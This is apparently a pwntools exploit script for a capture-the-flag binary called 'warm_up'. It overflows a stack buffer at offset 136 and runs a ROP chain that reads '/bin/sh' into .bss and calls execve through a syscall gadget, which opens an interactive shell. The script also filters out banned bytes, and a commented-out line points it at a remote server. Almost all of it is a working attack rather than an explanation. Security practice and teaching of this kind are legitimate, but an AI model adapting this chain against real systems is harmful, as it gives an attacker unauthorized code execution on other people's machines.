from pwn import *

context.binary = elf = ELF('./warm_up')   # arch=amd64, no-PIE expected (confirm with checksec)

BAD = set(b'/sat')   # 0x2f 0x73 0x61 0x74
def clean(b):
    assert not (set(b) & BAD), f"filtered byte in {b!r}"
    return b

rop = ROP(elf)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_rbx = 0x485d2b # found with ROPgadget
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall'])[0]
read_fn = elf.symbols.get('read', 0)
bss = 0x4c72a0 + 0x10

for n, g in [('rdi', pop_rdi), ('rsi', pop_rsi), ('rdx', pop_rdx_rbx),
             ('rax', pop_rax), ('syscall', syscall)]:
    log.info(f"{n} = {g:#x}")
    clean(p64(g))

# want to read the 8 bytes "/bin/sh\x00" into .bss + 0x10
# then call execve(*(.bss + 0x10), 0, 0)
# [rax] = 0x3b
# [rdi] = "/bin/sh\x00" (remember null-termination!)
# [rsi] = 0
# [rdx] = 0

OFFSET = 136
payload  = b'A' * OFFSET
payload += p64(pop_rdi) + p64(0)
payload += p64(pop_rsi) + p64(bss)
payload += p64(pop_rdx_rbx) + p64(8) + p64(0) 
payload += p64(read_fn)

payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(pop_rax) + p64(0x3b) # execve call number
payload += p64(syscall)

clean(payload)

assert len(payload) <= 0x120

io = process('./warm_up')
# io = remote('45.130.164.173', 2233)
io.recvuntil(b'show me what u got.')
io.send(payload)
io.send(b'/bin/sh\x00')
io.interactive()